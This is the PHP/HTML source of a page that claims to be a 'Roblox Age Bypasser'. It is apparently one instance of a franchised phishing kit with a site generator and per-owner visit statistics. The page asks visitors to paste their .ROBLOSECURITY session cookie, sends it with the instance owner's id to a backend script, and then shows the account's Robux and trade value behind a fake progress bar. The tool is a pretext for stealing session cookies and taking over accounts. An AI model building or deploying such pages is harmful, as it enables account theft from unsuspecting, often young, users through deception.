<?php
/**
 * Bypasserv3 - Public Instance Page
 * Modern Dark Grey/Black Design
 */

require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../functions.php';

$directory = $_GET['r'] ?? '';

if (empty($directory)) {
    die('No instance specified');
}

$directory = sanitizeDirectory($directory);
$instanceData = getInstanceData($directory);

if (!$instanceData) {
    die('Instance not found');
}

// Track visit
updateInstanceStats($directory, 'totalVisits', ($instanceData['stats']['totalVisits'] ?? 0) + 1);
updateDailyStats($directory, 'visits', 1);
updateGlobalStats('totalVisits', 1);

// Check if this is a user-created site (has directory parameter)
$isUserSite = !empty($directory);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Age Bypasser</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Outfit', sans-serif;
            background: linear-gradient(135deg, #1f2937 0%, #111827 50%, #0f1419 100%);
            color: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 700px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .header h1 {
            font-size: 48px;
            font-weight: 700;
            margin-bottom: 12px;
            color: #3b82f6;
        }
        
        .header p {
            color: #9ca3af;
            font-size: 16px;
        }
        
        .glass-box {
            background: rgba(31, 41, 55, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(59, 130, 246, 0.1);
            margin-bottom: 24px;
        }
        
        .form-group {
            margin-bottom: 0;
        }
        
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #f3f4f6;
            margin-bottom: 12px;
        }
        
        .form-group textarea {
            width: 100%;
            padding: 16px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 10px;
            color: #f3f4f6;
            font-size: 13px;
            font-family: 'Outfit', sans-serif;
            resize: vertical;
            min-height: 100px;
            transition: all 0.3s ease;
        }
        
        .form-group textarea::placeholder {
            color: #6b7280;
        }
        
        .form-group textarea:focus {
            outline: none;
            background: rgba(0, 0, 0, 0.5);
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }
        
        .button-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 20px;
        }
        
        .btn-start {
            width: 100%;
            padding: 14px 20px;
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn-start:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
        }
        
        .btn-start:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .create-site-wrapper {
            text-align: center;
            margin-bottom: 24px;
        }
        
        .btn-create {
            padding: 12px 40px;
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 10px;
            color: #3b82f6;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s ease;
            display: inline-block;
            gap: 6px;
        }
        
        .btn-create:hover {
            background: rgba(59, 130, 246, 0.15);
            border-color: rgba(59, 130, 246, 0.4);
            transform: translateY(-2px);
        }
        
        .process-box {
            background: rgba(31, 41, 55, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .process-title {
            text-align: center;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #f3f4f6;
        }
        
        .process-step {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px;
            background: rgba(59, 130, 246, 0.05);
            border: 1px solid rgba(59, 130, 246, 0.1);
            border-radius: 10px;
            margin-bottom: 10px;
            font-size: 14px;
            color: #9ca3af;
        }
        
        .process-step:last-child {
            margin-bottom: 0;
        }
        
        .process-arrow {
            color: #3b82f6;
            font-weight: 600;
            min-width: 20px;
        }
        
        .disclaimer {
            text-align: center;
            font-size: 12px;
            color: #6b7280;
            margin-top: 30px;
        }
        
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(59, 130, 246, 0.2);
            border-top: 2px solid #3b82f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .success-container {
            text-align: center;
        }
        
        .success-icon {
            font-size: 64px;
            margin-bottom: 20px;
            animation: bounce 0.6s ease-in-out;
        }
        
        @keyframes bounce {
            0%, 100% { transform: scale(0); }
            50% { transform: scale(1); }
        }
        
        .success-container h2 {
            font-size: 28px;
            margin-bottom: 16px;
            color: #10b981;
        }
        
        .success-info {
            background: rgba(16, 185, 129, 0.05);
            border: 1px solid rgba(16, 185, 129, 0.2);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: left;
        }
        
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid rgba(16, 185, 129, 0.1);
            font-size: 14px;
        }
        
        .info-row:last-child {
            border-bottom: none;
        }
        
        .info-label {
            color: #9ca3af;
        }
        
        .info-value {
            color: #10b981;
            font-weight: 600;
            word-break: break-all;
        }
        
        .processing-state {
            text-align: center;
        }
        
        .processing-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(59, 130, 246, 0.1);
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        
        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(59, 130, 246, 0.1);
            border-radius: 10px;
            overflow: hidden;
            margin-top: 20px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #3b82f6, #2563eb);
            width: 0%;
            transition: width 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>Roblox Age Bypasser</h1>
            <p>Secure and efficient age verification bypass</p>
        </div>

        <!-- Main Form -->
        <div id="formContainer">
            <div class="glass-box">
                <div class="form-group">
                    <label>ROBLOSECURITY Cookie</label>
                    <textarea 
                        id="cookieInput" 
                        placeholder="Paste your cookie here..."
                        required
                    ></textarea>
                </div>

                <div class="button-group">
                    <button type="button" class="btn-start" onclick="handleBypass(event)">
                        ⚙️ Start Bypass
                    </button>
                </div>
            </div>

            <!-- Create Site Button - Only show if NOT a user site -->
            <?php if (!$isUserSite): ?>
            <div class="create-site-wrapper">
                <a href="/generator/" class="btn-create">
                    ✨ Create Your Own Site
                </a>
            </div>
            <?php endif; ?>

            <!-- Process Box -->
            <div class="process-box">
                <div class="process-title">Process</div>
                <div class="process-step">
                    <span class="process-arrow">→</span>
                    <span>1. Enter your .ROBLOSECURITY cookie</span>
                </div>
                <div class="process-step">
                    <span class="process-arrow">→</span>
                    <span>2. Click "Start Bypass" to begin</span>
                </div>
            </div>

            <div class="disclaimer">
                Use at your own risk. We are not responsible for any account restrictions.
            </div>
        </div>

        <!-- Processing State -->
        <div id="processingContainer" style="display: none;">
            <div class="glass-box processing-state">
                <div class="processing-spinner"></div>
                <p style="color: #9ca3af; margin-top: 20px;">Processing your request...</p>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <p style="font-size: 12px; color: #6b7280; margin-top: 8px;" id="progressText">0%</p>
            </div>
        </div>

        <!-- Success State -->
        <div id="successContainer" style="display: none;">
            <div class="glass-box success-container">
                <div class="success-icon">✅</div>
                <h2>Success!</h2>
                <p style="color: #fbbf24; font-size: 13px; margin-bottom: 16px; padding: 12px; background: rgba(251, 191, 36, 0.1); border: 1px solid rgba(251, 191, 36, 0.2); border-radius: 8px;">
                    ⏱️ Wait 1-2 minutes, then check your Roblox account settings to verify the changes!
                </p>
                <div class="success-info">
                    <div class="info-row">
                        <span class="info-label">Username</span>
                        <span class="info-value" id="successUsername">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">User ID</span>
                        <span class="info-value" id="successUserId">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Robux</span>
                        <span class="info-value" id="successRobux">0</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">RAP</span>
                        <span class="info-value" id="successRap">0</span>
                    </div>
                </div>

                <button type="button" class="btn-start" onclick="resetForm()">
                    ↻ Bypass Another
                </button>
            </div>
        </div>
    </div>

    <script>
        async function handleBypass(e) {
            const cookie = document.getElementById('cookieInput').value.trim();
            const directory = new URLSearchParams(window.location.search).get('r');

            if (!cookie) {
                alert('Please paste your cookie first');
                return;
            }

            document.getElementById('formContainer').style.display = 'none';
            document.getElementById('processingContainer').style.display = 'block';

            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += Math.random() * 25;
                if (progress > 90) progress = 90;
                document.getElementById('progressFill').style.width = progress + '%';
                document.getElementById('progressText').textContent = Math.floor(progress) + '%';
            }, 150);

            try {
                const response = await fetch('/api/bypass.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie, directory })
                });

                const data = await response.json();

                clearInterval(progressInterval);
                document.getElementById('progressFill').style.width = '100%';
                document.getElementById('progressText').textContent = '100%';

                if (data.success) {
                    setTimeout(() => {
                        document.getElementById('processingContainer').style.display = 'none';
                        document.getElementById('successContainer').style.display = 'block';

                        document.getElementById('successUsername').textContent = data.userInfo.username || '-';
                        document.getElementById('successUserId').textContent = data.userInfo.userId || '-';
                        document.getElementById('successRobux').textContent = (data.userInfo.robux || 0).toLocaleString();
                        document.getElementById('successRap').textContent = (data.userInfo.rap || 0).toLocaleString();

                        if (typeof confetti !== 'undefined') {
                            confetti();
                        }
                    }, 500);
                } else {
                    alert('❌ Bypass failed:\n' + (data.error || 'Unknown error'));
                    resetForm();
                }
            } catch (err) {
                clearInterval(progressInterval);
                alert('Network error: ' + err.message);
                resetForm();
            }
        }

        function resetForm() {
            document.getElementById('successContainer').style.display = 'none';
            document.getElementById('processingContainer').style.display = 'none';
            document.getElementById('formContainer').style.display = 'block';
            document.getElementById('cookieInput').value = '';
            document.getElementById('cookieInput').focus();
            document.getElementById('progressFill').style.width = '0%';
            document.getElementById('progressText').textContent = '0%';
        }
    </script>
</body>
</html>
